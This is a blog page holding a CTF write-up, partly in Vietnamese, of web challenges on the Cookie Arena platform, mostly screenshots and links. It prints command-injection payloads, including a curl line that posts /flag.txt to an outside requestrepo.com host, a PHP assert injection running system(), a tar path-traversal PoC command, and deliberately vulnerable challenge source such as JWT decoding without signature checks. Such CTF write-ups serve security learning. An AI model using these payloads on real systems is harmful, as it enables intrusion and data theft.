

<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Cookie arena - &gt; root@l3mnt2010:~# ./exploit.py</title>
  <meta name="description" content="Write up some chall (i solved all web &rsquo;s challenges in this platform)  Baby Ping Empty Execution Baby Crawler Ethical Ping Pong Club Blind Command Injection Time Break The Editor Jail Ping 0x01 Ping 0x02 Youtube Downloader The Existed File Are you a search engine bot Baby HTTP Method Bypass HMAC check Neonify Favorite JWT Baby Slippy BaBy Assert Baby Address Note      .">
  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "\u003e root@l3mnt2010:~# .\/exploit.py",
    
    "url": "https:\/\/l3mnt2010.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/l3mnt2010.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/l3mnt2010.github.io\/write-up\/2023-01-14-cookiearena\/",
          "name": "Cookie arena"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : ""
  },
  "headline": "Cookie arena",
  "description" : "Write up some chall (i solved all web \u0026rsquo;s challenges in this platform)  Baby Ping Empty Execution Baby Crawler Ethical Ping Pong Club Blind Command Injection Time Break The Editor Jail Ping 0x01 Ping 0x02 Youtube Downloader The Existed File Are you a search engine bot Baby HTTP Method Bypass HMAC check Neonify Favorite JWT Baby Slippy BaBy Assert Baby Address Note      \r\r\r\r\r.",
  "inLanguage" : "en",
  "wordCount":  952 ,
  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
  "keywords" : [ "CTF, Vietnamese" ],
  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/write-up\/2023-01-14-cookiearena\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/l3mnt2010.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>


<meta property="og:title" content="Cookie arena" />
<meta property="og:description" content="Write up some chall (i solved all web &rsquo;s challenges in this platform)  Baby Ping Empty Execution Baby Crawler Ethical Ping Pong Club Blind Command Injection Time Break The Editor Jail Ping 0x01 Ping 0x02 Youtube Downloader The Existed File Are you a search engine bot Baby HTTP Method Bypass HMAC check Neonify Favorite JWT Baby Slippy BaBy Assert Baby Address Note      .">
<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
<meta property="og:url" content="https://l3mnt2010.github.io/write-up/2023-01-14-cookiearena/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="&gt; root@l3mnt2010:~# ./exploit.py" />

  <meta name="twitter:title" content="Cookie arena" />
  <meta name="twitter:description" content="Write up some chall (i solved all web &rsquo;s challenges in this platform)  Baby Ping Empty Execution Baby Crawler Ethical Ping Pong Club Blind Command Injection Time Break The Editor Jail Ping 0x01 …">
  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
  <meta name="twitter:card" content="summary_large_image" />
  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.83.1" />
  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="&gt; root@l3mnt2010:~# ./exploit.py"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        
          
            <li>
              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
            </li>
          
        
          
            <li>
              <a title="Posts" href="https://l3mnt2010.github.io/posts">Posts</a>
            </li>
          
        
          
            <li>
              <a title="Write-up" href="https://l3mnt2010.github.io/write-up">Write-up</a>
            </li>
          
        
          
            <li>
              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
            </li>
          
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="&gt; root@l3mnt2010:~# ./exploit.py" href="https://l3mnt2010.github.io/">
            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="&gt; root@l3mnt2010:~# ./exploit.py" />
           
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="write-up-heading">
              
                <h1>Cookie arena</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        
  <div class="toc-container">
    <div class="toc">
      <nav id="TableOfContents">
        
        <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li><a href="#write-up-some-chall-i-solved-all-web-s-challenges-in-this-platform">Write up some chall (i solved all web &rsquo;s challenges in this platform)</a>
          <ol>
            <li><a href="#baby-ping">Baby Ping</a></li>
            <li><a href="#empty-execution">Empty Execution</a></li>
            <li><a href="#baby-crawler">Baby Crawler</a></li>
            <li><a href="#ethical-ping-pong-club">Ethical Ping Pong Club</a></li>
            <li><a href="#blind-command-injection">Blind Command Injection</a></li>
            <li><a href="#time">Time</a></li>
            <li><a href="#break-the-editor-jail">Break The Editor Jail</a></li>
            <li><a href="#ping-0x01">Ping 0x01</a></li>
            <li><a href="#ping-0x02">Ping 0x02</a></li>
            <li><a href="#youtube-downloader">Youtube Downloader</a></li>
            <li><a href="#the-existed-file">The Existed File</a></li>
            <li><a href="#are-you-a-search-engine-bot">Are you a search engine bot</a></li>
            <li><a href="#baby-http-method">Baby HTTP Method</a></li>
            <li><a href="#bypass-hmac-check">Bypass HMAC check</a></li>
            <li><a href="#neonify">Neonify</a></li>
            <li><a href="#favorite-jwt">Favorite JWT</a></li>
            <li><a href="#baby-slippy">Baby Slippy</a></li>
            <li><a href="#baby-assert">BaBy Assert</a></li>
            <li><a href="#baby-address-note">Baby Address Note</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
      </nav>
    </div>
  </div>

  <style>
     
    .toc-container {
      position: fixed;
      left: 0;
      top: 100px;  
      width: 350px;  
      max-height: 80vh;
      overflow-y: auto;
      overflow-x: auto;
      padding: 20px;
      border-right: 1px solid #eee;
      background-color: black;  
      z-index: 100;
      text-align: left;  
    }

    .toc {
      font-size: 2.6rem;  
      color: #fff;  
      text-align: left;  
    }

    .toc h4 {
      margin-top: 0;
      margin-bottom: 1rem;
      font-size: 1.6rem;  
      text-align: left;  
    }

     
    .toc ul, .toc ol {
      padding-left: 0;  
      margin: 0;
      list-style-type: none;
      text-align: left;  
    }

     
    .toc ul ul, .toc ul ol, .toc ol ul, .toc ol ol {
      padding-left: 10px;
    }

    .toc li {
      padding: 10px 0;
      line-height: 1.6;
      text-align: left;  
    }

    .toc a {
      text-decoration: none;
      color: #fff;  
      display: block;
      text-align: left;  
      padding-left: 3px;  
      font-size: 1.5rem;  
      transition: color 0.2s;
    }

    .toc a:hover {
      color: #ffcc00;  
    }

     
    .toc a.active {
      color: #ffcc00;  
      font-weight: bold;
      border-left: 4px solid #ffcc00;  
      padding-left: 3px;  
      margin-left: -5px;
    }

     
    .main-content {
      margin-left: 380px;  
    }

     
    @media (max-width: 1200px) {
      .toc-container {
        width: 280px;  
      }
      .main-content {
        margin-left: 320px;
      }
    }

    @media (max-width: 900px) {
      .toc-container {
        position: static;
        width: 100%;
        max-height: none;
        border-right: none;
        border-bottom: 1px solid #eee;
        margin-bottom: 20px;
      }
      .main-content {
        margin-left: 0;
      }
    }
  </style>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      
      function highlightTOC() {
        const headings = document.querySelectorAll('.main-content h1, .main-content h2, .main-content h3, .main-content h4, .main-content h5, .main-content h6');
        const tocLinks = document.querySelectorAll('.toc a');

        if (headings.length === 0 || tocLinks.length === 0) return;

        let currentActiveIndex = -1;
        const scrollPosition = window.scrollY;

        for (let i = 0; i < headings.length; i++) {
          const heading = headings[i];
          const headingTop = heading.offsetTop - 100;
          const headingBottom = headingTop + heading.offsetHeight;

          if (scrollPosition >= headingTop && scrollPosition <= headingBottom) {
            currentActiveIndex = i;
            break;
          }
        }

        tocLinks.forEach(link => link.classList.remove('active'));

        if (currentActiveIndex >= 0) {
          const currentHeading = headings[currentActiveIndex];
          const headingId = currentHeading.id;

          const correspondingLink = document.querySelector(`.toc a[href="#${headingId}"]`);
          if (correspondingLink) {
            correspondingLink.classList.add('active');

            const tocContainer = document.querySelector('.toc-container');
            const linkTop = correspondingLink.offsetTop;
            const containerScrollTop = tocContainer.scrollTop;
            const containerHeight = tocContainer.clientHeight;

            if (linkTop < containerScrollTop || linkTop > containerScrollTop + containerHeight) {
              tocContainer.scrollTop = linkTop - containerHeight / 2;
            }
          }
        }
      }

      highlightTOC();
      window.addEventListener('scroll', highlightTOC);
      window.addEventListener('resize', highlightTOC);

      const fragment = window.location.hash;
      if (fragment) {
        const element = document.querySelector(fragment);
        if (element) {
          element.scrollIntoView({ behavior: 'smooth' });

          const tocLinks = document.querySelectorAll('.toc a');
          tocLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === fragment) {
              link.classList.add('active');
            }
          });

          highlightTOC();
        }
      }

      const tocLinks = document.querySelectorAll('.toc a');
      tocLinks.forEach(link => {
        link.addEventListener('click', function(event) {
          const targetId = link.getAttribute('href').substring(1);
          const targetElement = document.getElementById(targetId);

          if (targetElement) {
            targetElement.scrollIntoView({ behavior: 'smooth' });

            tocLinks.forEach(l => l.classList.remove('active'));
            link.classList.add('active');

            history.pushState(null, null, `#${targetId}`);

            event.preventDefault();
          }
        });
      });
    });
  </script>  


<h2 id="write-up-some-chall-i-solved-all-web-s-challenges-in-this-platform">Write up some chall (i solved all web &rsquo;s challenges in this platform)</h2>
<h3 id="baby-ping">Baby Ping</h3>
<p><img src="https://hackmd.io/_uploads/Hkc4ahQXR.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/S1rI6nXQ0.png" alt="image"></p>
<h3 id="empty-execution">Empty Execution</h3>
<p><img src="https://hackmd.io/_uploads/r1ywhTQ7R.png" alt="image"></p>
<ul>
<li>Tạo reversere shell để tiến hành đọc flag</li>
</ul>
<h3 id="baby-crawler">Baby Crawler</h3>
<p><img src="https://hackmd.io/_uploads/rk100a77R.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HyaAAaQX0.png" alt="image"></p>
<p>bypass escapeshellcmd: <a href="https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md">https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md</a></p>
<h3 id="ethical-ping-pong-club">Ethical Ping Pong Club</h3>
<p><img src="https://hackmd.io/_uploads/S1VCEAQ70.png" alt="image"></p>
<h3 id="blind-command-injection">Blind Command Injection</h3>
<p><img src="https://hackmd.io/_uploads/rJZSLCQmC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/Byb48R7Q0.png" alt="image"></p>
<h3 id="time">Time</h3>
<p><img src="https://hackmd.io/_uploads/S1aZVJNQR.png" alt="image"></p>
<h3 id="break-the-editor-jail">Break The Editor Jail</h3>
<p><a href="https://zacheller.dev/text-editor-jail">https://zacheller.dev/text-editor-jail</a></p>
<p><a href="https://b4d.sablun.org/blog/2020-02-16-247ctf-com-misc-the-text-editor-jail/">https://b4d.sablun.org/blog/2020-02-16-247ctf-com-misc-the-text-editor-jail/</a></p>
<h3 id="ping-0x01">Ping 0x01</h3>
<p><img src="https://hackmd.io/_uploads/S1y9wJNQC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rkbYDJ4X0.png" alt="image"></p>
<h3 id="ping-0x02">Ping 0x02</h3>
<p><img src="https://hackmd.io/_uploads/rkXG51NQC.png" alt="image"></p>
<p><a href="https://forum.cookiearena.org/t/web-ping-0x01-ping-0x02-os-command-injection/164">https://forum.cookiearena.org/t/web-ping-0x01-ping-0x02-os-command-injection/164</a></p>
<h3 id="youtube-downloader">Youtube Downloader</h3>
<p>chỉ cần ;cat%20/flag.txt là được.</p>
<h3 id="the-existed-file">The Existed File</h3>
<pre><code>$(curl${IFS}-X${IFS}POST${IFS}--data${IFS}@/flag.txt${IFS}http://fvcwu3xj.requestrepo.com)
</code></pre><p><img src="https://hackmd.io/_uploads/BklnRJ4XA.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rk93AkNmC.png" alt="image"></p>
<h3 id="are-you-a-search-engine-bot">Are you a search engine bot</h3>
<ul>
<li>Bài này mình sẽ sử dụng google bot để crawling tất cả những path ẩn
<a href="https://www.stanventures.com/blog/googlebot-user-agent-string/">https://www.stanventures.com/blog/googlebot-user-agent-string/</a></li>
</ul>
<p><img src="https://hackmd.io/_uploads/S1gFC2NQC.png" alt="image"></p>
<h3 id="baby-http-method">Baby HTTP Method</h3>
<p><img src="https://hackmd.io/_uploads/rJiEL1BX0.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HJwH8yBm0.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rygLUkS7C.png" alt="image"></p>
<h3 id="bypass-hmac-check">Bypass HMAC check</h3>
<p><img src="https://hackmd.io/_uploads/SyVJb-r7C.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/SJaebZHXA.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ByoWWbHmC.png" alt="image"></p>
<p><a href="https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/">https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/</a></p>
<h3 id="neonify">Neonify</h3>
<p><img src="https://hackmd.io/_uploads/BJYqFZr7A.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/r1QfcWBm0.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/HkFXc-HmR.png" alt="image"></p>
<h3 id="favorite-jwt">Favorite JWT</h3>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>

<span class="kn">import</span> <span class="nn">jwt</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Response</span><span class="p">,</span> <span class="n">redirect</span>
<span class="kn">from</span> <span class="nn">flask_limiter</span> <span class="kn">import</span> <span class="n">Limiter</span>
<span class="kn">from</span> <span class="nn">flask_limiter.util</span> <span class="kn">import</span> <span class="n">get_remote_address</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">limiter</span> <span class="o">=</span> <span class="n">Limiter</span><span class="p">(</span>
    <span class="n">app</span><span class="o">=</span><span class="n">app</span><span class="p">,</span>
    <span class="n">key_func</span><span class="o">=</span><span class="n">get_remote_address</span><span class="p">,</span>
    <span class="n">default_limits</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;50000 per hour&#34;</span><span class="p">],</span>
    <span class="n">storage_uri</span><span class="o">=</span><span class="s2">&#34;memory://&#34;</span><span class="p">,</span>
<span class="p">)</span>

<span class="n">secret</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get_new_cookie</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s2">&#34;user&#34;</span><span class="p">:</span> <span class="s2">&#34;normal&#34;</span><span class="p">},</span> <span class="n">secret</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s2">&#34;HS256&#34;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">check_cookie</span><span class="p">(</span><span class="n">cookie</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;verify_signature&#34;</span><span class="p">:</span> <span class="bp">False</span><span class="p">},</span> <span class="n">algorithms</span><span class="o">=</span><span class="s2">&#34;HS256&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;user&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
<span class="nd">@limiter.limit</span><span class="p">(</span><span class="s2">&#34;5/second&#34;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="n">mimetype</span><span class="o">=</span><span class="s2">&#34;text/plain&#34;</span><span class="p">)</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span>
<span class="nd">@limiter.limit</span><span class="p">(</span><span class="s2">&#34;5/second&#34;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">flag_endpoint</span><span class="p">():</span>
    <span class="k">if</span> <span class="s2">&#34;token&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="p">:</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)</span>
        <span class="n">ret</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s2">&#34;token&#34;</span><span class="p">,</span> <span class="n">get_new_cookie</span><span class="p">())</span>
        <span class="k">return</span> <span class="n">ret</span>
    <span class="k">if</span> <span class="n">check_cookie</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;token&#34;</span><span class="p">)):</span>
        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/flag.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="s2">&#34;Only admins can view the flag!&#34;</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
</code></pre></div><ul>
<li>Truy cập /flag nhưng khi verify jwt thì ra <code>admin</code> mới có thể truy cập vào để lấy flag.</li>
</ul>
<p><img src="https://hackmd.io/_uploads/rk0GVABXA.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BJ2EE0HmR.png" alt="image"></p>
<h3 id="baby-slippy">Baby Slippy</h3>
<pre><code>python2 poc.py -o unix -d 0 -p app/application/blueprints/ routes.py -f evil.tar.gz
</code></pre><p><img src="https://hackmd.io/_uploads/BJflB18mC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rJrbSy8QC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1E8S18mA.png" alt="image"></p>
<ul>
<li>Bây giờ thì sol bài toán</li>
</ul>
<p><img src="https://hackmd.io/_uploads/S10ILJIQR.png" alt="image"></p>
<h3 id="baby-assert">BaBy Assert</h3>
<ul>
<li>Đây là payload mà mình tìm được ở hacktrick
<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#rce-via-assert">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#rce-via-assert</a></li>
</ul>
<p><img src="https://hackmd.io/_uploads/HkTgdkIX0.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/BkaZd18XC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/ByRvOJ8mC.png" alt="image"></p>
<ul>
<li>Để hiểu rõ cơ chế hoạt động của nó thì mình sẽ thử RCE để lấy nội dung của file index.php</li>
</ul>
<p><img src="https://hackmd.io/_uploads/H1WnOJ8XR.png" alt="image"></p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">assert_options</span><span class="p">(</span><span class="nx">ASSERT_ACTIVE</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
<span class="nx">assert_options</span><span class="p">(</span><span class="nx">ASSERT_BAIL</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
<span class="nx">assert_options</span><span class="p">(</span><span class="nx">ASSERT_WARNING</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>

<span class="nv">$title</span> <span class="o">=</span> <span class="s2">&#34;Baby Assert&#34;</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span> <span class="p">{</span>
	<span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">];</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="nv">$page</span> <span class="o">=</span> <span class="s2">&#34;home&#34;</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$page</span> <span class="o">=</span> <span class="nx">urldecode</span><span class="p">(</span><span class="nv">$page</span><span class="p">);</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="s2">&#34;pages/&#34;</span> <span class="o">.</span> <span class="nv">$page</span> <span class="o">.</span> <span class="s2">&#34;.php&#34;</span><span class="p">;</span>

<span class="c1">// &#39;..&#39; is dangerous!
</span><span class="c1"></span><span class="nx">assert</span><span class="p">(</span><span class="s2">&#34;strpos(&#39;</span><span class="si">$file</span><span class="s2">&#39;, &#39;..&#39;) === false&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Detected hacking attempt!&#34;</span><span class="p">);</span>

<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><ul>
<li>Với payload của mình thì:</li>
</ul>
<p>$file = &ldquo;pages/a',&lsquo;NeVeR&rsquo;) === false and system(&lsquo;cat+index.php&rsquo;) and strpos(&lsquo;a.php&rdquo;;</p>
<p>Lúc này assert trở thành:</p>
<p>assert(&ldquo;strpos(&lsquo;pages/a&rsquo;,&lsquo;NeVeR&rsquo;) === false and system(&lsquo;cat+index.php&rsquo;) and strpos(&lsquo;a.php&rsquo;, &lsquo;..') === false&rdquo;) or die(&ldquo;Detected hacking attempt!&quot;);</p>
<ul>
<li>Đó vậy là trở thành câu lệnh đúng</li>
</ul>
<h3 id="baby-address-note">Baby Address Note</h3>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Response</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">g</span>
<span class="kn">import</span> <span class="nn">functools</span>
<span class="kn">import</span> <span class="nn">sqlite3</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">120</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get_db</span><span class="p">():</span>
    <span class="n">db</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s1">&#39;_database&#39;</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">db</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">db</span> <span class="o">=</span> <span class="n">g</span><span class="o">.</span><span class="n">_database</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;/tmp/address.db&#39;</span><span class="p">)</span>
        <span class="n">db</span><span class="o">.</span><span class="n">isolation_level</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="n">db</span><span class="o">.</span><span class="n">row_factory</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">Row</span>
    <span class="k">return</span> <span class="n">db</span>


<span class="k">def</span> <span class="nf">query_db</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(),</span> <span class="n">one</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="k">with</span> <span class="n">app</span><span class="o">.</span><span class="n">app_context</span><span class="p">():</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
